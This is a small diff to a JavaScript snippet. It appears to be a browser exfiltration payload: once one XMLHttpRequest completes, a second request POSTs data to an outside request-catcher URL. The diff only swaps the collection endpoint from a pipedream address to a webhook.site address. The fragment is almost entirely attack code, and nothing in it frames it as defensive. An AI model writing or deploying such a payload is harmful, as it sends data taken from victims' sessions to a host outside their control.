@@ -7,7 +7,7 @@ xhr.onreadystatechange = function() {
   if (xhr.readyState == 4) {
 
         var http = new XMLHttpRequest();
-        var url = "https://enf957zfzra6.x.pipedream.net/";
+        var url = "https://webhook.site/f86252e0-552c-4df5-8ce0-8086d964800e";
         http.open("POST", url, true);
         http.setRequestHeader("Content-type", "text/plain");
         http.onreadystatechange = function() {
